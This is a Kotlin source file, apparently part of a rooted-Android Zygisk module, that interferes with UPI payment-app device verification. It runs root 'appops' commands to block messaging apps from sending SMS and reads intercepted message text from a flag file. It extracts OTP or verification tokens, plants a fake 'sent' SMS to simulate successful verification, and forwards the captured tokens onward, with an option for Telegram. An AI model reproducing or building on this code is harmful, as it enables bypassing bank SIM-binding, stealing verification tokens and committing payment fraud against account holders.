package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log
import java.io.File

/**
 * Hooked UPI verify ke dauran real SIM se SMS na jaye — Messages / MMS SEND_SMS block.
 * Native ISms hook ke saath double protection.
 */
object OutgoingSmsGuard {

    private const val TAG = "OutgoingSmsGuard"

    private val messagingPackages = listOf(
        "com.google.android.apps.messaging",
        "com.android.mms",
        "com.samsung.android.messaging",
        "com.android.mms.service"
    )

    @Volatile
    private var blocked = false

    fun refresh(context: Context) {
        val config = ConfigManager(context).load()
        val shouldBlock = config.interceptFakeSuccess &&
            SmsMatcher.enabledHookedApps(config).isNotEmpty() &&
            isHookedAppForeground(context, config)

        if (shouldBlock && !blocked) {
            blockMessagingSend()
            blocked = true
            Log.i(TAG, "SEND_SMS blocked for messaging apps (UPI verify)")
        } else if (!shouldBlock && blocked) {
            restoreMessagingSend()
            blocked = false
            Log.i(TAG, "SEND_SMS restored for messaging apps")
        }

        processBlockedFlag(context)
    }

    private fun isHookedAppForeground(context: Context, config: ModuleConfig): Boolean {
        val fg = ForegroundAppHelper.foregroundPackage(context) ?: return false
        if (config.hookedUpiApps[fg] == true) return true
        val recent = readRecentHookedPackage()
        if (!recent.isNullOrBlank() && config.hookedUpiApps[recent] == true) {
            val fgMessaging = messagingPackages.any { it == fg }
            return fgMessaging
        }
        return false
    }

    private fun readRecentHookedPackage(): String? {
        return try {
            val f = File("/data/local/tmp/hivirtus_active_upi.txt")
            if (!f.canRead()) return null
            f.readLines().lastOrNull { it.isNotBlank() }?.trim()
        } catch (_: Exception) {
            null
        }
    }

    private fun blockMessagingSend() {
        messagingPackages.forEach { pkg ->
            ShellHelper.runSu("appops set $pkg SEND_SMS deny 2>/dev/null")
        }
    }

    private fun restoreMessagingSend() {
        messagingPackages.forEach { pkg ->
            ShellHelper.runSu("appops set $pkg SEND_SMS allow 2>/dev/null")
        }
    }

    private fun processBlockedFlag(context: Context) {
        val flag = File("/data/local/tmp/hivirtus_outgoing_blocked.flag")
        if (!flag.canRead()) return
        try {
            val line = flag.readText().trim()
            if (line.isBlank()) return
            val parts = line.split("|", limit = 2)
            val dest = parts.getOrElse(0) { "" }
            val body = parts.getOrElse(1) { "" }
            if (dest.isBlank() || body.isBlank()) return

            val configManager = ConfigManager(context)
            val config = configManager.load()
            val app = SmsMatcher.matchedHookedApp(config, dest, body)
            val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
            val otp = LastOtp(
                otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
                sender = interceptDisplay,
                body = body,
                phone = interceptDisplay,
                messageLabel = app?.displayName.orEmpty(),
                direction = "outgoing",
                rawPeer = dest,
                capturedAt = System.currentTimeMillis()
            )
            OtpCaptureWriter.write(context, otp)
            FakeSmsSuccessHelper.insertFakeSentSms(context, dest, body)
            TokenForwarder(configManager, context).forward(otp)
            if (config.fakeInterceptTelegram) {
                TokenForwarder(configManager, context).forwardFakeIntercept(otp)
            }
            flag.delete()
        } catch (e: Exception) {
            Log.w(TAG, "Blocked flag process failed: ${e.message}")
        }
    }
}
